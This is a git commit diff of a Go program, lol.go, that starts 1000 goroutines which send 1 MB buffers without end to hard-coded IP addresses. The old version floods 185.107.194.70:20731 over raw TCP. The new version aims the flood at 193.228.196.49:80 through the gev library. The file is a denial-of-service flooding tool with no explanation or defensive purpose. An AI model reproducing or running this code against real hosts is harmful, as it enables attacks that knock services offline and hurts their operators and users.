44db67c0b37afd43154072842aeeaa2a68cdcbca
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-10-19 13:42:48 +0600

    Update lol.go

--- lol.go
+++ lol.go
@@ -1,30 +1,45 @@
 package main
 
 import (
-	"net"
+	"github.com/Allenxuxu/gev"
+	"github.com/Allenxuxu/gev/connection"
+	"log"
 	"sync"
 )
 
-func main() {
-	var wg sync.WaitGroup
-	data := make([]byte, 1024*1024) // 1 MB of data
+type exampleClient struct {
+	data []byte
+}
 
-	for i := 0; i < 1000; i++ { // Adjust number of threads as needed
+func (s *exampleClient) OnConnect(c *connection.Connection) {
+	log.Println("OnConnect")
+	c.Send(s.data)
+}
+
+func (s *exampleClient) OnMessage(c *connection.Connection, ctx interface{}, data []byte) (out []byte) {
+	log.Println("OnMessage")
+	return
+}
+
+func (s *exampleClient) OnClose(c *connection.Connection) {
+	log.Println("OnClose")
+}
+
+func main() {
+	data := make([]byte, 1024*1024) // 1 MB of data
+	var wg sync.WaitGroup
+
+	for i := 0; i < 1000; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
+			client, err := gev.NewClient("193.228.196.49:80", &exampleClient{data: data}, nil)
+			if err != nil {
+				log.Fatalln("NewClient failed:", err)
+			}
+
 			for {
-				conn, err := net.Dial("tcp", "185.107.194.70:20731")
-				if err != nil {
-					continue // if connection fails, retry
-				}
-				for {
-					_, err := conn.Write(data) // Send 1 MB of data
-					if err != nil {
-						conn.Close()
-						break // if write fails, close and open a new connection
-					}
-				}
+				client.Send(data)
 			}
 		}()
 	}
